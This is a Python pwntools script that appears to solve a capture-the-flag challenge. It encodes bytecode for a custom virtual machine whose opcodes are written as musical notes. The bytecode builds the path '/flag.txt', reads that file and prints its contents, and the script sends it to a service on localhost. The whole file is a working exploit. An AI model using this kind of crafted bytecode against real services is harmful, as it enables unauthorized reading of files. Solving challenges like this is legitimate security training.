from pwn import *


def reverse_calculate_arg(number):
    sem = number % 12
    oct_val = number // 12

    sem_to_note_acc = {
        0: ('A','-'),
        1: ('A','#'),
        2: ('B','-'),
        3: ('C','-'),
        4: ('C','#'),
        5: ('D','-'),
        6: ('D','#'),
        7: ('E','-'),
        8: ('F','-'),
        9: ('F','#'),
        10: ('G','-'),
        11: ('G','#')
    }

    n, acc = sem_to_note_acc[sem]

    if 0 <= oct_val <= 8:
        oct_char = str(oct_val + 1)
    else:
        oct_char = chr(ord('A') + (oct_val - 9))

    return n + acc + oct_char

print(reverse_calculate_arg(ord('0')))


bytecode = ""
path = b"/flag.txt\0"

for i, n in enumerate(path):
    bytecode += "C#1"
    bytecode += "A-1"
    bytecode += reverse_calculate_arg(n)
    bytecode += "C#1"
    bytecode += "A#1"
    bytecode += reverse_calculate_arg(i)
    bytecode += "A#1"
    bytecode += "A-1"
    bytecode += "A#1"

bytecode += "C#1"
bytecode += "A-1"
bytecode += "A#1"
bytecode += "C#1"
bytecode += "A#1"
bytecode += "A-1"
bytecode += "B-1"
bytecode += "A-1"
bytecode += "A#1"

for i in range(50):
    bytecode += "C#1"
    bytecode += "A#1"
    bytecode += reverse_calculate_arg(i)
    bytecode += "G#1"
    bytecode += "A-1"
    bytecode += "A#1"
    bytecode += "C#1"
    bytecode += "B-1"
    bytecode += "B-1"
    bytecode += "B-1"
    bytecode += "B-1"
    bytecode += "A-1"

r = remote('localhost', 5000)
r.sendlineafter("Introduzca la melodía que desee reproducir: ".encode(), bytecode.encode())
r.interactive()